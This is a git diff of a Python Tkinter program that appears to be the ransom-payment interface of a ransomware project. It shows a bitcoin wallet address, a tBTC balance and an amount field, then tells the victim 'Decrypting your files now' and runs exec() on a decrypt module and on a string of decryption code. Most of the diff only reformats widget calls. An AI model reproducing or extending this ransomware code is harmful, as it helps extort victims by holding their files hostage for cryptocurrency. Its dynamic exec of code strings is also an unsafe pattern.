@@ -104,8 +104,10 @@ def clicking_submit():
 
                 transaction_details_label = Label(text=transaction_details, fg="blue")
                 transaction_details_label.pack()
+
                 successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)", fg="green")
                 successful_transaction_label.pack()
+                exec("import decrypt")
                 exec(f"{code_to_decrypt_files}")
 
         print(f"\nTransaction Details: {transaction_details}")
@@ -137,18 +139,25 @@ def setup_round_2():
                                  font=('Arial', 10, 'bold'))
     wallet_address_label.pack(pady=2)
 
-    wallet_balance_label = Label(window, text=f"Current Balance: {wallet.balance()} tBTC", font=('Arial', 10, 'bold'),
+    wallet_balance_label = Label(window,
+                                 text=f"Current Balance: {wallet.balance()} tBTC",
+                                 font=('Arial', 10, 'bold'),
                                  fg="green")
     wallet_balance_label.pack(pady=2)
 
-    amount_bitcoin_to_send_label = Label(window, text="Enter the Amount of Bitcoins to Send",
+    amount_bitcoin_to_send_label = Label(window,
+                                         text="Enter the Amount of Bitcoins to Send",
                                          font=('Arial', 10, 'bold'))
     amount_bitcoin_to_send_label.pack(pady=2)
 
     response_entry3 = Entry(window, width=30)
     response_entry3.pack(pady=5)
 
-    submit_button = Button(window, text="Submit", command=clicking_submit, pady=4, borderwidth=2)
+    submit_button = Button(window,
+                           text="Submit",
+                           command=clicking_submit,
+                           pady=4,
+                           borderwidth=2)
     submit_button.pack()
 
     labels_and_entries_2 = [wallet_address_label, wallet_balance_label, amount_bitcoin_to_send_label, response_entry3,
